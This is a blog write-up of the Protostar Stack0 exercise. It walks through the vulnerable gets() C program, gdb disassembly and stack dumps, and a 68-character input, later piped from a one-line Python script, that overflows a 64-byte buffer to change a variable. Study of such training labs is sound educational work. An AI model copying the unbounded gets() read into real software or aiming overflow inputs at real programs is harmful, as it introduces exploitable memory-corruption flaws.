---
layout: post
title:  "Protostar Stack0"
date:   2023-03-15 09:00:00 +1100
categories: Journey
tags: 
---

This is a simple c program that contains the highly exploitable gets function that allows buffer overflows as it does not validate for input length.

Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

We can see this main function disassembled through gdb:
```x86asm
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
```

We set two breakpoints, at and after the gets call `call   0x804830c <gets@plt>`:
```bash
(gdb) break *0x0804840c
Breakpoint 1 at 0x804840c: file stack0/stack0.c, line 11.
(gdb) break *0x08048411
Breakpoint 2 at 0x8048411: file stack0/stack0.c, line 13.
```

With a handy command I learnt through liveoverflow, we set a hook-stop
```bash
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers
>x/24wx $esp
>x/2i $esp
>end
```

Now we can see what information is in the registers, in the stack, and the next to lines of assembly that will be run.

My first run showed me how much my characters were filling up the stack:
```bash
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack0
eax            0xbffff77c       -1073744004
ecx            0xf15673fd       -245992451
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff760       0xbffff760
ebp            0xbffff7c8       0xbffff7c8
esi            0x0      0
edi            0x0      0
eip            0x804840c        0x804840c <main+24>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff760:     0xbffff77c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0xb7eada75
0xbffff780:     0xb7fd7ff4      0x08049620      0xbffff798      0x080482e8
0xbffff790:     0xb7ff1040      0x08049620      0xbffff7c8      0x08048469
0xbffff7a0:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7c8
0xbffff7b0:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000
0x804840c <main+24>:    call   0x804830c <gets@plt>
0x8048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]

Breakpoint 1, 0x0804840c in main (argc=1, argv=0xbffff874) at stack0/stack0.c:11
11      in stack0/stack0.c
(gdb) disass main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
End of assembler dump.
(gdb) c
Continuing.
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP
eax            0xbffff77c       -1073744004
ecx            0xbffff77c       -1073744004
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff760       0xbffff760
ebp            0xbffff7c8       0xbffff7c8
esi            0x0      0
edi            0x0      0
eip            0x8048411        0x8048411 <main+29>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff760:     0xbffff77c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0x41414141
0xbffff780:     0x42424242      0x43434343      0x44444444      0x45454545
0xbffff790:     0x46464646      0x47474747      0x48484848      0x49494949
0xbffff7a0:     0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d
0xbffff7b0:     0x4e4e4e4e      0x4f4f4f4f      0x50505050      0x00000000
0x8048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]
0x8048415 <main+33>:    test   eax,eax

Breakpoint 2, main (argc=1, argv=0xbffff874) at stack0/stack0.c:13
13      in stack0/stack0.c
(gdb) C
Continuing.
Try again?

Program exited with code 013.
Error while running hook_stop:
The program has no registers now.
```

Looking at the stacks last line/top of the stack, 0x00000000 still has not changed, so when we perform `text eax,eax`/`modified != 0`, as the stack has not changed, it does not let us pass.

Running this again, except with 4 more characters to fill up the last segment of the stack we get the expected output:

```bash
(gdb) r
Starting program: /opt/protostar/bin/stack0
eax            0xbffff77c       -1073744004
ecx            0x1e70f126       510718246
edx            0x1      1
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff760       0xbffff760
ebp            0xbffff7c8       0xbffff7c8
esi            0x0      0
edi            0x0      0
eip            0x804840c        0x804840c <main+24>
eflags         0x200286 [ PF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff760:     0xbffff77c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0xb7eada75
0xbffff780:     0xb7fd7ff4      0x08049620      0xbffff798      0x080482e8
0xbffff790:     0xb7ff1040      0x08049620      0xbffff7c8      0x08048469
0xbffff7a0:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7c8
0xbffff7b0:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000
0x804840c <main+24>:    call   0x804830c <gets@plt>
0x8048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]

Breakpoint 1, 0x0804840c in main (argc=1, argv=0xbffff874) at stack0/stack0.c:11
11      in stack0/stack0.c
(gdb) c
Continuing.
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ
eax            0xbffff77c       -1073744004
ecx            0xbffff77c       -1073744004
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff760       0xbffff760
ebp            0xbffff7c8       0xbffff7c8
esi            0x0      0
edi            0x0      0
eip            0x8048411        0x8048411 <main+29>
eflags         0x200246 [ PF ZF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
0xbffff760:     0xbffff77c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff770:     0xb7fd7ff4      0xb7ec6165      0xbffff788      0x41414141
0xbffff780:     0x42424242      0x43434343      0x44444444      0x45454545
0xbffff790:     0x46464646      0x47474747      0x48484848      0x49494949
0xbffff7a0:     0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d
0xbffff7b0:     0x4e4e4e4e      0x4f4f4f4f      0x50505050      0x51515151
0x8048411 <main+29>:    mov    eax,DWORD PTR [esp+0x5c]
0x8048415 <main+33>:    test   eax,eax

Breakpoint 2, main (argc=1, argv=0xbffff874) at stack0/stack0.c:13
13      in stack0/stack0.c
(gdb) c
Continuing.
you have changed the 'modified' variable

Program exited with code 051.
Error while running hook_stop:
The program has no registers now.
```

We can clean up this solution with below:

```python
print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ"
```

Running like below sends the output of the python script straight to STDIN of the stack0 program, providing us with desired output.
```bash
user@protostar:/tmp$ python pattern.py | /opt/protostar/bin/stack0
you have changed the 'modified' variable
```
